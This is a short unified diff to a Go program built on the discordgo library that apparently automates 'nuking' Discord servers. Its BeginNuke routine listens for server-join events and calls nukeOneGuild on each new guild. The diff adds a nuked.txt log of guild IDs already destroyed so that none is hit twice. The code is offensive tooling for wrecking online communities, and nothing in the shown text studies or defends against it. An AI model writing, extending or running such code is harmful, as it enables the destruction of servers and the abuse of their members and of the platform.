@@ -1,10 +1,13 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"math/rand"
 	"sync"
 	"time"
+
+	"os"
 
 	"github.com/bwmarrin/discordgo"
 	"golang.org/x/exp/slices"
@@ -36,7 +39,22 @@ func (na NukeAccount) BeginNuke() error {
 			if slices.Contains(exempt, m.ID) {
 				return
 			}
+			file, err := os.OpenFile("nuked.txt", os.O_APPEND|os.O_CREATE|os.O_RDWR, 0644)
+			if err != nil {
+				logger.Errorln("Error opening nuked file: ", err)
+				return
+			}
+      defer file.Close()
+      scanner:=bufio.NewScanner(file)
+      for scanner.Scan(){
+        id:=scanner.Text()
+        if id==m.ID{
+          return
+        }
+      }
 			na.nukeOneGuild(m.ID)
+
+			file.WriteString(m.ID + "\n")
 		})
 		fmt.Println("Auto nuke is listening for server-join events")
 		wg.Wait()
